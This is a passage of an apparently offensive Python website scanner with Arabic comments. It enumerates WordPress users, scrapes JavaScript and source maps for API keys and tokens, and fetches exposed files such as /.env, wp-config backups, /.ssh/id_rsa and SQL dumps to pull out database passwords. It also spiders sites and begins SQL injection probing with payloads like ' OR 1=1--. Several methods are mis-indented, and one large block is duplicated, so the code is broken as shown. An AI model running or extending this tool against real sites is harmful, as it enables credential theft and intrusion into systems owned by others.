        'Instagram': r'instagram\.com/([a-zA-Z0-9_.]{3,})',
        'LinkedIn': r'linkedin\.com/(?:company|in)/([a-zA-Z0-9\-]{3,})',
        'Telegram': r't\.me/([a-zA-Z0-9_]{3,})',
        'YouTube': r'youtube\.com/@([a-zA-Z0-9_\-]{3,})'
    }.items():
        for m in re.findall(pt, txt, re.I):
            if m.lower() not in self.skip_social:
                data['social'].add(f"{pl}: @{m}")

    # ─── WordPress Admin Enum — متعدد الطرق ───
    existing_slugs = {a['slug'] for a in data['admins']}

    # طريقة 1: WP REST API v2 (قد يكون مفعّلاً)
    for wp_ep in [
        f"{url}/wp-json/wp/v2/users?per_page=100",
        f"{url}/wp-json/wp/v2/users",
        f"{url}/?rest_route=/wp/v2/users",
        f"{url}/index.php?rest_route=/wp/v2/users",
    ]:
        try:
            wp = self.s.get(wp_ep, timeout=5,
                            headers={'X-WP-Nonce': '', 'Accept': 'application/json'})
            if wp.status_code == 200 and wp.text.strip().startswith('['):
                import json as _j
                for u in _j.loads(wp.text):
                    slug = u.get('slug', '')
                    if slug and slug not in existing_slugs:
                        existing_slugs.add(slug)
                        data['admins'].append({
                            'name': self.fix_encoding(u.get('name', slug)),
                            'slug': slug,
                            'id': u.get('id', '?'),
                            'link': u.get('link', '')
                        })
                break
        except:
            pass

    # طريقة 2: Author enum (?author=N → /author/slug/)
    for i in range(1, 15):
        try:
            r = self.s.get(f"{url}/?author={i}",
                           timeout=3, allow_redirects=True)
            if '/author/' in r.url:
                sl = r.url.split('/author/')[-1].strip('/')
                if sl and sl not in existing_slugs and len(sl) > 1:
                    existing_slugs.add(sl)
                    data['names'].add(f"WP-Author-{i}: {sl}")
                    # حاول نجيب الإيميل من صفحة الكاتب
                    try:
                        ar = self.s.get(r.url, timeout=2)
                        for em in re.findall(
                                r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',
                                ar.text):
                            if self.ok_email(em):
                                all_emails.add(em.lower())
                    except:
                        pass
        except:
            pass

    # طريقة 3: Sitemap users
    try:
        sm = self.s.get(f"{url}/wp-sitemap-users-1.xml", timeout=3)
        if sm.status_code == 200:
            for nm in re.findall(r'<loc>[^<]*/author/([^/]+)/', sm.text):
                if nm not in existing_slugs:
                    existing_slugs.add(nm)
                    data['names'].add(f"WP-Sitemap: {nm}")
    except:
        pass

    return {
        k: (sorted(list(v)) if isinstance(v, set) else v)
        for k, v in data.items()
    }

    def verify_emails(self, emails):
        v = []; seen = set()
        emails_list = [em for em in list(emails)[:15]
                       if em not in seen and not seen.add(em)]

        def check_one(em):
            r = {'em': em, 'ok': False, 'why': '', 'prov': ''}
            if not re.match(
                    r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
                    em):
                r['why'] = 'صيغة خطأ'; return r
            dd = em.split('@')[1]
            try: socket.gethostbyname(dd)
            except: r['why'] = 'دومين ✗'; return r
            try:
                j = requests.get(
                    f"https://dns.google/resolve?name={dd}&type=MX",
                    timeout=2).json()
                mx = j.get('Answer', [])
                if mx:
                    r['ok'] = True; r['why'] = 'MX ✓'
                    ms = mx[0].get('data', '').lower()
                    if 'google' in ms: r['prov'] = 'Google'
                    elif 'microsoft' in ms: r['prov'] = 'Microsoft'
                else: r['why'] = 'لا MX'
            except: r['why'] = 'فشل'
            return r

        # فحص متوازٍ
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            v = list(ex.map(check_one, emails_list))
        return v

    def get_secrets(self, url):
        r = {'js': [], 'sec': [], 'ep': [], 'maps': [], 'strings': []}
    url = self.norm(url)

    try:
        resp = self.s.get(url, timeout=5)
        if not resp or resp.status_code != 200:
            return r

        # ─── جمع كل ملفات JS ───
        js_files = list(set(
            re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']',
                       resp.text)))
        # إضافة Source Maps إذا موجودة
        maps = list(set(
            re.findall(r'sourceMappingURL=([^\s"\']+\.map)',
                       resp.text)))
        r['maps'] = maps[:10]
        r['js'] = js_files[:30]

        # ─── تحميل كل ملفات JS ───
        all_js_content = resp.text

        def fetch_js(js_url):
            try:
                full = urljoin(url, js_url.split('?')[0])
                jr = self.s.get(full, timeout=3)
                if jr.status_code == 200:
                    return jr.text
            except:
                pass
            return ""

        # تحميل متوازٍ لكل الملفات
        with concurrent.futures.ThreadPoolExecutor(
                max_workers=10) as ex:
            contents = list(ex.map(fetch_js, js_files[:20]))

        for content in contents:
            if content:
                all_js_content += "\n" + content

        # ─── فحص Source Maps ───
        for map_url in maps[:5]:
            try:
                full_map = urljoin(url, map_url)
                mr = self.s.get(full_map, timeout=3)
                if mr.status_code == 200:
                    all_js_content += "\n" + mr.text
            except:
                pass

        # ─── Patterns للكشف ───
        patterns = {
            'AWS Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret': r'(?:aws_secret|secret_key)["\s:=]+["\']([A-Za-z0-9/+=]{40})["\']',
            'Google API': r'AIza[0-9A-Za-z_\-]{35}',
            'Google OAuth': r'[0-9]+-[a-zA-Z0-9_]{32}\.apps\.googleusercontent\.com',
            'Firebase': r'https://[a-z0-9-]+\.firebaseio\.com',
            'Firebase Key': r'AIza[0-9A-Za-z_\-]{35}',
            'JWT': r'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]+',
            'Private Key': r'-----BEGIN (?:RSA|EC|DSA)? ?PRIVATE KEY-----',
            'Password': r'(?:password|passwd|pwd|pass)["\s:=]+["\']([^"\']{4,50})["\']',
            'Secret': r'(?:secret|api_secret)["\s:=]+["\']([a-zA-Z0-9_\-]{10,})["\']',
            'API Key': r'(?:api_key|apikey|api-key)["\s:=]+["\']([a-zA-Z0-9_\-]{10,})["\']',
            'Token': r'(?:token|auth_token|access_token)["\s:=]+["\']([a-zA-Z0-9_\-\.]{20,})["\']',
            'DB URL': r'(?:mongodb|mysql|postgres|redis|mssql)://[^\s"\'<>]+',
            'DB Password': r'(?:DB_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD)["\s:=]+["\']([^"\']+)["\']',
            'Internal IP': r'(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}',
            'S3 Bucket': r'[a-zA-Z0-9.-]+\.s3\.amazonaws\.com',
            'Slack Token': r'xox[baprs]-[0-9a-zA-Z]{10,}',
            'GitHub Token': r'gh[pousr]_[A-Za-z0-9_]{36,}',
            'Stripe Key': r'(?:sk|pk)_(?:live|test)_[a-zA-Z0-9]{20,}',
            'Twilio': r'SK[a-f0-9]{32}',
            'SendGrid': r'SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}',
            'Mailgun': r'key-[a-zA-Z0-9]{32}',
            'SSH Key': r'-----BEGIN OPENSSH PRIVATE KEY-----',
            'Heroku Key': r'(?:heroku)["\s:=]+["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']',
        }

        for name, pat in patterns.items():
            try:
                matches = re.findall(pat, all_js_content, re.I)
                for m in matches[:3]:
                    val = str(m).strip()
                    if len(val) > 3:
                        r['sec'].append({'t': name, 'v': val[:80]})
            except:
                pass

        # ─── API Endpoints ───
        ep_patterns = [
            r'["\'](/api/[^"\']{3,100})["\']',
            r'["\'](/v[0-9]+/[^"\']{3,100})["\']',
            r'fetch\s*\(["\']([^"\']{5,100})["\']',
            r'axios\.[a-z]+\s*\(["\']([^"\']{5,100})["\']',
            r'\.get\s*\(["\']([^"\']{5,100})["\']',
            r'\.post\s*\(["\']([^"\']{5,100})["\']',
            r'url\s*[:=]\s*["\']([^"\']{5,100})["\']',
            r'endpoint\s*[:=]\s*["\']([^"\']{5,100})["\']',
            r'baseURL\s*[:=]\s*["\']([^"\']{5,100})["\']',
            r'BASE_URL\s*[:=]\s*["\']([^"\']{5,100})["\']',
        ]

        eps = set()
        for pat in ep_patterns:
            try:
                matches = re.findall(pat, all_js_content, re.I)
                for m in matches:
                    m = m.strip()
                    if (len(m) > 3 and
                            not m.endswith(('.js', '.css', '.png',
                                           '.jpg', '.gif', '.svg'))
                            and 'localhost' not in m.lower()):
                        eps.add(m)
            except:
                pass
        r['ep'] = sorted(list(eps))[:30]

        # ─── Strings مشفرة ───
        b64_pattern = r'["\']([A-Za-z0-9+/]{40,}={0,2})["\']'
        b64_matches = re.findall(b64_pattern, all_js_content)
        for b64 in b64_matches[:5]:
            try:
                import base64
                decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                if any(kw in decoded.lower() for kw in
                       ['password', 'secret', 'key', 'token',
                        'api', 'auth', 'admin', 'user']):
                    r['strings'].append({
                        'encoded': b64[:30] + '...',
                        'decoded': decoded[:100]
                    })
            except:
                pass

    except Exception:
        pass

    # إزالة تكرار
    seen_secs = set()
    unique_secs = []
    for s in r['sec']:
        key = f"{s['t']}-{s['v'][:20]}"
        if key not in seen_secs:
            seen_secs.add(key)
            unique_secs.append(s)
    r['sec'] = unique_secs

    return r

    def get_creds(self, url):
        c = {'usr': [], 'pwd': [], 'tok': [], 'cfg': []}
    url = self.norm(url)
    txt = ""
    found_pages = []  # نتتبع ايش وجدنا

    # ─── صفحات موسعة جداً ───
    pages = [
        # ملفات config أساسية
        '/.env', '/.env.local', '/.env.backup', '/.env.prod', '/.env.dev',
        '/.env.old', '/.env.save', '/.env.bak', '/.env.example',
        '/config.php', '/config.php.bak', '/config.php.old', '/config.inc.php',
        '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old',
        '/wp-config-sample.php', '/wp-config.txt',
        '/configuration.php', '/configuration.php.bak',
        '/sites/default/settings.php', '/sites/default/settings.local.php',
        '/web.config', '/web.config.bak',
        # Laravel / Django / Node
        '/.env.testing', '/bootstrap/app.php', '/config/database.php',
        '/config/app.php', '/app/config/database.php',
        '/settings.py', '/local_settings.py', '/settings_local.py',
        # Backup files
        '/backup.sql', '/dump.sql', '/database.sql', '/db.sql',
        '/backup.zip', '/.htpasswd', '/.htaccess',
        # Info files  
        '/phpinfo.php', '/info.php', '/php.php', '/test.php',
        '/server-info', '/server-status',
        # Git exposed
        '/.git/config', '/.git/COMMIT_EDITMSG',
        # Docker / deployment
        '/docker-compose.yml', '/docker-compose.yaml',
        '/Dockerfile', '/.dockerenv',
        # SSH / Keys
        '/.ssh/id_rsa', '/.ssh/authorized_keys',
        # Old files
        '/old/', '/backup/', '/bak/',
        # Admin paths
        '/admin/config.php', '/administrator/config.php',
    ]

    def fetch_cred_page(pg):
        try:
            r = self.s.get(f"{url}{pg}", timeout=4,
                           allow_redirects=False)
            # 200 = مفتوح مباشرة
            if r.status_code == 200 and len(r.text) > 5:
                return pg, r.text
            # بعض السيرفرات تحوّل ملفات config لصفحة download
            if r.status_code in [200, 206] and r.headers.get('Content-Type','').startswith('application'):
                return pg, r.text
        except:
            pass
        return pg, ""

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        results = list(ex.map(fetch_cred_page, pages))

    # ⚠️ **الإصلاح**: دمج النتائج بشكل صحيح
    for pg, content in results:
        if content and len(content) > 10:
            txt += content + "\n"
            found_pages.append(pg)

    # إذا لم يتم جمع أي شيء، نحاول بطريقة بديلة (جلب الصفحة الرئيسية)
    if not txt:
        try:
            r = self.s.get(url, timeout=5, allow_redirects=True)
            if r.status_code == 200:
                txt = r.text
        except:
            pass

    if not txt or len(txt) < 50:
        return c

    # ─── Patterns محسّنة وأوسع ───
    pats = {
        'usr': [
            # WordPress
            r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]",
            # .env
            r'(?:DB_USER(?:NAME)?|MYSQL_USER|POSTGRES_USER|DB_LOGIN)\s*=\s*["\']?([^\s"\'#\n]{2,40})',
            # PHP generic
            r"(?:user|login|username)\s*[=:]+\s*['\"]([^'\"]{3,40})['\"]",
            # Laravel config
            r"'username'\s*=>\s*'([^']{3,40})'",
            # Docker compose
            r'(?:MYSQL_USER|POSTGRES_USER|DB_USERNAME):\s*([^\s\n]{2,40})',
        ],
        'pwd': [
            # WordPress
            r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]*)['\"]",
            # .env
            r'(?:DB_PASS(?:WORD)?|MYSQL_PASSWORD|POSTGRES_PASSWORD|DATABASE_PASSWORD|APP_KEY|SECRET_KEY|SECRET)\s*=\s*["\']?([^\s"\'#\n]{4,})',
            # PHP generic
            r"(?:pass|pwd|password|passwd)\s*[=:]+\s*['\"]([^'\"]{4,})['\"]",
            # Laravel
            r"'password'\s*=>\s*'([^']{4,})'",
            # htpasswd format
            r'^([a-zA-Z0-9_\-\.]+):\$(?:apr1|2y)\$[^\s]+',
            # Docker
            r'(?:MYSQL_ROOT_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD):\s*([^\s\n]{4,})',
        ],
        'tok': [
            # WordPress auth keys
            r"define\s*\(\s*['\"](?:AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|AUTH_SALT|SECURE_AUTH_SALT|LOGGED_IN_SALT|NONCE_SALT)['\"]\s*,\s*['\"]([^'\"]+)['\"]",
            # .env API keys
            r'(?:API_KEY|APIKEY|API_TOKEN|AUTH_TOKEN|ACCESS_TOKEN|STRIPE_KEY|STRIPE_SECRET|TWILIO_TOKEN|SENDGRID_KEY|MAILGUN_KEY|PUSHER_APP_KEY|PUSHER_APP_SECRET|FIREBASE_KEY|GOOGLE_API_KEY|AWS_KEY|AWS_SECRET)\s*=\s*["\']?([^\s"\'#\n]{10,})',
            # JWT
            r'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]+',
            # Generic token
            r"(?:token|api_key|apikey|secret|auth_key|access_token)\s*[=:]+\s*['\"]([a-zA-Z0-9_\-\.]{15,})['\"]",
            # AWS
            r'AKIA[0-9A-Z]{16}',
            # GitHub PAT
            r'gh[pousr]_[A-Za-z0-9_]{36,}',
            # Google API
            r'AIza[0-9A-Za-z_\-]{35}',
            # Slack
            r'xox[baprs]-[0-9a-zA-Z]{10,}',
        ],
        'cfg': [
            # WordPress DB config
            r"define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]",
            r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]",
            # .env DB
            r'(?:DB_HOST|DATABASE_HOST|MYSQL_HOST|POSTGRES_HOST)\s*=\s*["\']?([^\s"\'#\n]+)',
            r'(?:DB_NAME|DATABASE_NAME|MYSQL_DATABASE|POSTGRES_DB)\s*=\s*["\']?([^\s"\'#\n]+)',
            r'(?:DB_PORT|DATABASE_PORT|MYSQL_PORT|POSTGRES_PORT)\s*=\s*([0-9]+)',
            # Connection strings
            r'(?:mongodb|mysql|postgres|redis|mssql|postgresql)://[^\s"\'<>]+',
            # phpMyAdmin host
            r"\$cfg\['Servers'\]\[\$i\]\['host'\]\s*=\s*'([^']+)'",
            # Laravel
            r"'host'\s*=>\s*env\(['\"]DB_HOST['\"],\s*'([^']+)'\)",
            # Git config remote
            r'url\s*=\s*(https?://[^\s]+)',
        ],
    }

        for key, patterns in pats.items():
            seen_vals = set()
            for pat in patterns:
                try:
                    matches = re.findall(pat, txt, re.I | re.MULTILINE)
                    for m in matches:
                        val = str(m).strip()
                    # فلتر القيم الفارغة أو placeholder
                    if (len(val) < 2 or
                            val in ('your_password', 'password', 'secret',
                                    'changeme', 'enter_password', 'your_key',
                                    'example', 'yoursecret', '', 'null', 'none')):
                        continue
                    if val not in seen_vals:
                        seen_vals.add(val)
                        c[key].append(val)
            except:
                pass
        c[key] = c[key][:12]  # أكثر من قبل

    # ─── أضف معلومة الصفحات اللي وجدنا فيها ───
    if found_pages:
        c['cfg'].extend([f"[مكتشف في: {pg}]" for pg in found_pages[:5]])

    return c

        # ─── Patterns محسّنة وأوسع ───
pats = {
            'usr': [
                # WordPress
                r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]",
                # .env
                r'(?:DB_USER(?:NAME)?|MYSQL_USER|POSTGRES_USER|DB_LOGIN)\s*=\s*["\']?([^\s"\'#\n]{2,40})',
                # PHP generic
                r"(?:user|login|username)\s*[=:]+\s*['\"]([^'\"]{3,40})['\"]",
                # Laravel config
                r"'username'\s*=>\s*'([^']{3,40})'",
                # Docker compose
                r'(?:MYSQL_USER|POSTGRES_USER|DB_USERNAME):\s*([^\s\n]{2,40})',
            ],
            'pwd': [
                # WordPress
                r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]*)['\"]",
                # .env
                r'(?:DB_PASS(?:WORD)?|MYSQL_PASSWORD|POSTGRES_PASSWORD|DATABASE_PASSWORD|APP_KEY|SECRET_KEY|SECRET)\s*=\s*["\']?([^\s"\'#\n]{4,})',
                # PHP generic
                r"(?:pass|pwd|password|passwd)\s*[=:]+\s*['\"]([^'\"]{4,})['\"]",
                # Laravel
                r"'password'\s*=>\s*'([^']{4,})'",
                # htpasswd format
                r'^([a-zA-Z0-9_\-\.]+):\$(?:apr1|2y)\$[^\s]+',
                # Docker
                r'(?:MYSQL_ROOT_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD):\s*([^\s\n]{4,})',
            ],
            'tok': [
                # WordPress auth keys
                r"define\s*\(\s*['\"](?:AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|AUTH_SALT|SECURE_AUTH_SALT|LOGGED_IN_SALT|NONCE_SALT)['\"]\s*,\s*['\"]([^'\"]+)['\"]",
                # .env API keys
                r'(?:API_KEY|APIKEY|API_TOKEN|AUTH_TOKEN|ACCESS_TOKEN|STRIPE_KEY|STRIPE_SECRET|TWILIO_TOKEN|SENDGRID_KEY|MAILGUN_KEY|PUSHER_APP_KEY|PUSHER_APP_SECRET|FIREBASE_KEY|GOOGLE_API_KEY|AWS_KEY|AWS_SECRET)\s*=\s*["\']?([^\s"\'#\n]{10,})',
                # JWT
                r'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]+',
                # Generic token
                r"(?:token|api_key|apikey|secret|auth_key|access_token)\s*[=:]+\s*['\"]([a-zA-Z0-9_\-\.]{15,})['\"]",
                # AWS
                r'AKIA[0-9A-Z]{16}',
                # GitHub PAT
                r'gh[pousr]_[A-Za-z0-9_]{36,}',
                # Google API
                r'AIza[0-9A-Za-z_\-]{35}',
                # Slack
                r'xox[baprs]-[0-9a-zA-Z]{10,}',
            ],
            'cfg': [
                # WordPress DB config
                r"define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]",
                r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]",
                # .env DB
                r'(?:DB_HOST|DATABASE_HOST|MYSQL_HOST|POSTGRES_HOST)\s*=\s*["\']?([^\s"\'#\n]+)',
                r'(?:DB_NAME|DATABASE_NAME|MYSQL_DATABASE|POSTGRES_DB)\s*=\s*["\']?([^\s"\'#\n]+)',
                r'(?:DB_PORT|DATABASE_PORT|MYSQL_PORT|POSTGRES_PORT)\s*=\s*([0-9]+)',
                # Connection strings
                r'(?:mongodb|mysql|postgres|redis|mssql|postgresql)://[^\s"\'<>]+',
                # phpMyAdmin host
                r"\$cfg\['Servers'\]\[\$i\]\['host'\]\s*=\s*'([^']+)'",
                # Laravel
                r"'host'\s*=>\s*env\(['\"]DB_HOST['\"],\s*'([^']+)'\)",
                # Git config remote
                r'url\s*=\s*(https?://[^\s]+)',
            ],
        }

        for key, patterns in pats.items():
            seen_vals = set()
            for pat in patterns:
                try:
                    matches = re.findall(pat, txt, re.I | re.MULTILINE)
                    for m in matches:
                        val = str(m).strip()
                        # فلتر القيم الفارغة أو placeholder
                        if (len(val) < 2 or
                                val in ('your_password', 'password', 'secret',
                                        'changeme', 'enter_password', 'your_key',
                                        'example', 'yoursecret', '', 'null', 'none')):
                            continue
                        if val not in seen_vals:
                            seen_vals.add(val)
                            c[key].append(val)
                except:
                    pass
            c[key] = c[key][:12]  # أكثر من قبل

        # ─── أضف معلومة الصفحات اللي وجدنا فيها ───
        if found_pages:
            c['cfg'].extend([f"[مكتشف في: {pg}]" for pg in found_pages[:5]])

        return c

    def get_cookies(self, url):
        try:
            r = self.s.get(self.norm(url), timeout=3)
            return [{'n': c.name, 'sec': c.secure, 'ho': 'httponly' in str(c).lower()} for c in r.cookies]
        except: return []

    def get_forms(self, url):
        fs = []; seen = set()
        try:
            r = self.s.get(self.norm(url), timeout=3)
            r.encoding = r.apparent_encoding or 'utf-8'
            for f in re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.DOTALL|re.I):
                a = re.search(r'action=["\']([^"\']*)["\']', f, re.I)
                m = re.search(r'method=["\']([^"\']*)["\']', f, re.I)
                inp = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', f, re.I)
                pw = bool(re.search(r'type=["\']password["\']', f, re.I))
                up = bool(re.search(r'type=["\']file["\']', f, re.I))
                is_drupal = 'form_build_id' in f or 'form_id' in f
                action = a.group(1) if a else 'self-submit'
                if not inp and not pw and not up: continue
                key = f"{action}-{'-'.join(sorted(inp[:5]))}"
                if key in seen: continue
                seen.add(key)
                ftype = "Drupal" if is_drupal else "Login" if pw else "Upload" if up else "Search" if ('s' in inp and len(inp) <= 3) else "Contact" if any(x in ' '.join(inp).lower() for x in ['email','message','comment']) else "Other"
                fs.append({'a': action, 'm': (m.group(1) if m else 'GET').upper(), 'i': inp, 'pw': pw, 'up': up, 'type': ftype, 'drupal': is_drupal})
        except: pass
        return fs

    def get_comments(self, url):
        try:
            r = self.s.get(self.norm(url), timeout=3)
            r.encoding = r.apparent_encoding or 'utf-8'
            comments = []
            seen_comments = set()

            for c in re.findall(r'<!--(.*?)-->', r.text, re.DOTALL):
                c = c.strip()

                # فلتر 1: طول
                if len(c) < 10 or len(c) > 400:
                    continue

                # فلتر 2: IE conditionals
                if c.startswith('[if') or c.startswith('<!['):
                    continue

                # فلتر 3: كلمات garbage
                cl = c.lower()
                skip_words = {
                    'icon', 'wrapper', 'boxed', 'fusion', 'sidebar',
                    'footer', 'header', 'nav', 'menu', 'container',
                    'section', 'widget', 'slider', 'banner', 'logo',
                    'hero', 'modal', 'overlay', 'apple touch', 'android',
                    'ms edge', '[if ', 'endif', 'google tag',
                    'google analytics', 'gtag', 'site kit', 'recaptcha',
                    'adsense', 'adsbygoogle', 'html5 element',
                    'ie6', 'ie7', 'ie8', 'ie9', 'conditional',
                    # إضافة جديدة — padding garbage
                    'padding to disable',
                    'msie and chrome',
                    'friendly error page',
                    'padding',
                    'browser',
                    'quic.cloud',
                    'litespeed cache',
                    'page optimized',
                    'page cached',
                    'guest mode',
                    'ccss loaded',
                    'ucss loaded',
                }
                if any(sk in cl for sk in skip_words):
                    continue

                # فلتر 4: regex وكود مشوّه
                regex_signs = [
                    '?(*', '?(.*', ')?(', '(?:', '.*?',
                    '\\d', '\\w', '\\s', '[^', '(?=',
                    '(?!', '{0,', '{1,', '|.*|']
                if any(sign in c for sign in regex_signs):
                    continue

                # فلتر 5: نسبة حروف
                letters = len(re.findall(r'[a-zA-Z\u0600-\u06FF]', c))
                if len(c) > 0 and letters / len(c) < 0.3:
                    continue

                # فلتر 6: base64
                if re.match(r'^[A-Za-z0-9+/=]{30,}$',
                             c.replace('\n', '')):
                    continue

                # فلتر 7: HTML tags
                if re.search(r'<[a-z]+[^>]*>', c, re.I):
                    continue

                # فلتر 8: إزالة تكرار
                c_normalized = re.sub(r'\s+', ' ', c).lower()
                if c_normalized in seen_comments:
                    continue
                seen_comments.add(c_normalized)

                comments.append(self.fix_encoding(c[:150]))

            return comments[:8]

        except:
            return []

    def get_robots(self, url):
        r = {
            'dis': [],
            'sm': [],
            'cms_hints': [],
            'checked': [],
            'managed': '',
            'has_useful_paths': False
        }

        url = self.norm(url)
        drupal_h = ['/modules','/themes','/profiles','/sites','/includes',
                    '/misc','cron.php','update.php','CHANGELOG.txt']
        wp_h = ['/wp-admin','/wp-includes','/wp-content']
        joomla_h = ['/components','/administrator']

        try:
            resp = self.s.get(f"{url}/robots.txt", timeout=3)
            if resp.status_code != 200:
                return r

            content = resp.text
            low = content.lower()

            # كشف Cloudflare managed robots
            if 'cloudflare managed content' in low or 'content-signal' in low:
                r['managed'] = 'Cloudflare'

            seen_paths = set()

            for line in content.splitlines():
                line = line.strip()
                low_line = line.lower()

                # sitemap
                if low_line.startswith('sitemap:'):
                    val = line.split(':', 1)[1].strip()
                    if val:
                        r['sm'].append(val)
                    continue

                # فقط Disallow
                if not low_line.startswith('disallow:'):
                    continue

                path = line.split(':', 1)[1].strip()

                # تجاهل root والفراغ
                if not path or path == '/':
                    continue

                # تجاهل wildcards العامة
                if path in ['/*', '*']:
                    continue

                if path not in seen_paths:
                    seen_paths.add(path)
                    r['dis'].append(path)

            # CMS hints
            if any(h in low for h in drupal_h):
                r['cms_hints'].append('Drupal')
            if any(h in low for h in wp_h):
                r['cms_hints'].append('WordPress')
            if any(h in low for h in joomla_h):
                r['cms_hints'].append('Joomla')

            # إذا ماكو مسارات مفيدة لا تفحص
            if not r['dis']:
                return r

            def chk(path):
                try:
                    full = f"{url}{path}" if path.startswith('/') else f"{url}/{path}"
                    resp2 = self.s.get(full, timeout=1.5, allow_redirects=False)
                    return {'path': path, 'st': resp2.status_code}
                except:
                    return {'path': path, 'st': 'TO'}

            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                checked = list(ex.map(chk, r['dis'][:15]))

            # إزالة التكرار
            seen_checked = set()
            for item in checked:
                key = f"{item['path']}-{item['st']}"
                if key not in seen_checked:
                    seen_checked.add(key)
                    r['checked'].append(item)

            # هل عندنا مسارات مفيدة فعلاً؟
            useful_statuses = {200, 301, 302, 403, 401, 500}
            r['has_useful_paths'] = any(
                item.get('st') in useful_statuses
                for item in r['checked']
            )

        except:
            pass

        return r

    def rev_ip(self, ip):
        try:
            r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=5)
            if r.status_code == 200:
                text = r.text.strip()
                if any(x in text.lower() for x in ['error','exceeded','quota','limit','membership','invalid']): return []
                return [d.strip() for d in text.split('\n') if d.strip() and d.strip() != ip][:12]
        except: pass
        return []

    def spider(self, url, mx=35, cb=None):
        url = self.norm(url); d = self.dom(url); wu = url
        for u in [url.replace('https://', 'http://'), url]:
            try:
                if self.s.get(u, timeout=3).status_code > 0: wu = u; break
            except: continue
        vis, files, q = set(), set(), [wu]
        fails = [0]  # عداد الفشل المتتالي

        # ─── نضيف صفحات ثابتة مهمة لقائمة الانتظار ───
        static_important = [
            '/sitemap.xml', '/sitemap_index.xml', '/robots.txt',
            '/wp-content/uploads/', '/wp-includes/', '/wp-admin/',
            '/uploads/', '/files/', '/documents/', '/media/',
            '/assets/', '/static/', '/downloads/',
        ]
        for si in static_important:
            q.append(f"{wu}{si}")

        skip_ext = ['jpg','jpeg','png','gif','svg','webp','ico','bmp','tiff',
                    'css','woff','woff2','ttf','eot','otf','mp3','mp4','avi','mov','map']

        while q and len(vis) < mx:
            cur = q.pop(0)
            if cur in vis: continue
            vis.add(cur)
            if cb: cb(len(vis), mx)
            try:
                r = self.s.get(cur, timeout=3, allow_redirects=True)
                r.encoding = r.apparent_encoding or 'utf-8'
                if r.status_code != 200:
                    fails[0] += 1
                    if fails[0] >= 5: break  # 5 فشل متتالي = يوقف
                    continue
                fails[0] = 0  # reset عند النجاح

                for lk in re.findall(r'href=["\']([^"\'#]+)["\']', r.text):
                    full = urljoin(cur, lk.split('?')[0].split('#')[0])
                    if d not in urlparse(full).netloc: continue
                    fname = unquote(full.split('/')[-1].split('?')[0]).lower()
                    ext = fname.split('.')[-1] if '.' in fname else ''

                    if ext in skip_ext: continue

                    # PDF — فقط حساس
                    if ext == 'pdf':
                        if any(kw in fname for kw in self.sensitive_pdf):
                            files.add(full)
                        continue

                    # ملفات بيانات مهمة
                    if ext in self.data_ext:
                        files.add(full); continue

                    if full not in vis and full not in q: q.append(full)

                # JS مهمة فقط
                for js in re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', r.text):
                    js_name = js.split('/')[-1].split('?')[0]
                    if self.js_hash_pattern.match(js_name): continue
                    if self.hex_hash_pattern.match(js_name): continue
                    if js_name in ['jquery.min.js','jquery.js','jquery-migrate.min.js']: continue
                    if any(ij in js_name.lower() for ij in self.important_js):
                        full_js = urljoin(cur, js.split('?')[0])
                        if d in urlparse(full_js).netloc: files.add(full_js)

            except: fails[0] += 1; continue

        # إزالة تكرار بالاسم
        unique = {}
        for f in files:
            name = unquote(f.split('/')[-1].split('?')[0])
            if name not in unique: unique[name] = f
        return {'pg': sorted(list(vis)), 'fl': sorted(list(unique.values()))[:20]}

    def build_tree(self, pages):
        tr = {}
        for pg in pages:
            path = unquote(urlparse(pg).path.strip('/'))
            parts = path.split('/') if path else ['[root]']
            n = tr
            for p in parts:
                if p not in n: n[p] = {}
                n = n[p]
        lines = []
        def walk(nd, pf=""):
            items = list(nd.items())
            for i, (nm, sub) in enumerate(items):
                c = "└── " if i == len(items)-1 else "├── "; lines.append(f"{pf}{c}{nm}")
                walk(sub, pf + ("    " if i == len(items)-1 else "│   "))
        walk(tr); return lines[:30]

    def sqli(self, url):
        results = []; url = self.norm(url)
        plds = [("'","qt"),("' OR '1'='1","OR"),("' OR 1=1--","cm"),("' UNION SELECT NULL--","UN")]
        errs = ['sql syntax','mysql','sqlite','postgresql','you have an error','unclosed quotation','warning: mysql']
        try:
